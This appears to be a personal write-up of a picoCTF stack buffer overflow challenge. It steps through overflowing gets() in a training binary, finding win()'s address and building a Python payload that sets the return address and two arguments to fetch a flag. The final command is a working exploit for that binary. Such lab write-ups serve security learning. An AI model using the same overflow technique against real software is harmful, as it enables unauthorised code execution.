----------------------------------------------------------
Description
Control the return address and arguments 
This time you'll need to control the arguments to the function you return to! 
Can you get the flag from this program? 
You can view source here. 
And connect with it using nc saturn.picoctf.net 61956
----------------------------------------------------------

SIMILAR CHALLENGE TO BUFFER OVERFLOW 1, BUT HERE WE HAVE TO WORK NOT ONLY WITH RETURN ADDRESS BUT ALSO WITH 2 ARGUMENTS

1. Run the instance

2. Download the program 'vuln' and the source code 'vuln.c'
    
3. Run the app with 'nc saturn.picoctf.net 61956'
    - Please enter your string: 
        - test
    - test
    
    ONE MORE TRY (test, if the jumped address changes with different input string)
    - Please enter your string: 
        - AAA
    - AAA
    
    Everytime we get the same result as our given input...
    
4. Inspect the code of 'vuln.c'
    - our goal is to overflow the gets(buf) on line 29 to call the first function win(unsigned int arg1, unsigned int arg2)
        - it prints us the flag that is saved in "flag.txt" file... 
        - arg1 has to be 0xDEADBEEF in hex
        - arg2 has to be 0xDEADC0DE in hex
    - define BUFSIZE 100 is big enought to enter long input
    - main function consists of:
        - setvbuf
        - puts to show the challenge for user to give it an input string
            - user input string is then saved under vuln()
                - vuln() is void 
                                    
                        
5. Overflow the given app
    - I dont wanna regenerate the instance everytime...lets make it offline
        - chmod +x vuln
        - ./vuln
    - echo `python3 -c "print('A'*100)"` | ./vuln
        - still no overflow, lets try more
    - echo `python3 -c "print('A'*120)"` | ./vuln
        - too much, Segmentation fault
            - sudo dmesg | tail
                - we can see the segfault is at 41414141
            - readelf -s vuln
                - lets find the address of flag address ... of win() function
                - win() is at: 08049296
                
    - get a little help with python
        - python3
            - import pwn
            - pwn.p32(0x08049296)
                - converts address to reverse value of it
                - b'\x96\x92\x04\x08'
                    - add this to our command
                        - echo `python3 -c "print('A'*120 + '\x96\x92\x04\x08')"` | ./vuln


echo `python3 -c "print('A'*112 + '\x96\x92\x04\x08' + 'CCCC' + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde')"` | ./vuln
        
